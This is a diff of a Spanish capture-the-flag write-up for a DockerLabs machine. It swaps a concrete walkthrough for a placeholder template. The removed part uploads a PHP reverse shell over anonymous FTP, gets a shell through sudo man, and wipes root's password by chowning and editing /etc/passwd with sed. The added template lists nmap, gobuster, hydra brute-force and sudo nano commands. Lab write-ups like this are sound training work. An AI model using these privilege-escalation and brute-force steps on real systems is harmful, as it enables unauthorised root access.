@@ -1,5 +1,5 @@
 ---
-title: Dockerlabs1
+title: -Pn
 excerpt: WritheUp maquina de DockerLabs
 publishDate: 'Sept 19 2024'
 isFeatured: true
@@ -15,49 +15,120 @@ seo:
 
 
 
+## Información General
 
 
-> Web frameworks are the architectural blueprints that empower developers to build the digital landscapes of tomorrow.
+- **Plataforma:** https://dockerlabs.es
+- **Dificultad:** Fácil
+- **Categoría:** Pentesting
+- **Autor:** El Pinguino de Mario
 
+---
 
+## Herramientas Utilizadas
 
-Entramos por ftp con usuario anonymous.
-Nos conectamos desde el directorio Downloads en nuestra maquina atacante al host victima por ftp y subimos una reverse shell con ftp 
+- **nmap**
+- **ftp**
+- **msfvenom**
+- **netcat**
+
+---
+
+## Fase 1: Escaneo de Puertos
+
+### Comando
+
+```bash
+nmap -sSCV -p- --open --min-rate 5000 [IP] -Pn -n -vvv
 
 ```
-put  php-reverse-shell2.php
+
+
+
+
+### Resultados
+
+| Puerto | Servicio     | Descripción          |
+|--------|--------------|----------------------|
+| [80]   | [HTTP]       | [Servidor Apache]    |
+| [3000] | [HTTP]       | [Aplicación Node.js] |
+| [5000] | [SSH]        | [OpenSSH]            |
+
+---
+
+## Fase 2: Exploración Web
+
+### Navegación Inicial
+
+Descripción de los pasos al ingresar en el navegador.
+
+### Fuzzing de Directorios
+
+Comando utilizado para fuzzing:
+
+```bash
+gobuster dir -u http://[IP] -w [wordlist] -x [extensiones]
 ```
 
-Ya adentro revisamos los usuarios con:
+**Directorios encontrados:**
+
+- `/admin`
+- `/backend`
+
+### Archivos Importantes
+
+| Archivo   | Descripción               |
+|-----------|---------------------------|
+| `server.js` | Contiene [contraseña/token] |
+| [Otro]     | Descripción               |
+
+---
+
+## Fase 3: Ataque de Fuerza Bruta
+
+### Fuerza Bruta SSH con Hydra
+
+Comando utilizado:
+
+```bash
+hydra -l [usuario] -P [diccionario] ssh://[IP] -s [puerto]
 ```
-cat /etc/passwd | grep sh$
+
+**Resultado:** Encontrado el usuario **[usuario]** con la contraseña **[contraseña]**.
+
+---
+
+## Fase 4: Escalada de Privilegios
+
+### Análisis de Permisos
+
+Comprobación de permisos del usuario:
+
+```bash
+sudo -l
 ```
 
-Revisamos los permiso que tenemos:
+**Permiso importante:** Podemos ejecutar **nano** con privilegios elevados.
 
+### Modificación de `/etc/passwd`
 
+Pasos para modificar el archivo `/etc/passwd` y obtener acceso como root:
 
-Con el comando sudo -u pingu man man abrimos un binario y ponemos !/bin/bash
+```bash
+sudo nano /etc/passwd
+```
 
+Descripción de los cambios realizados para escalar privilegios.
 
+---
 
-Ahora somo el usuario pingu, repetimos el proceso:
+## Conclusión
 
+- **Usuario Final Obtenido:** [root/usuario objetivo]
+- **Flags:** [Flag obtenida: user.txt/root.txt]
 
+**Notas adicionales:**
+[Conclusiones, aprendizaje o herramientas nuevas usadas]
+```
 
-Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:
-
-`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`
-
-Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.
-
-`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`
-
-Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba
-
-`cp /tmp/passwd.tmp /etc/passwd`
-
-
-
-Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña
-
+Este formato está diseñado para seguir un flujo típico en la resolución de CTFs. Lo puedes ir rellenando paso a paso conforme realizas las actividades.
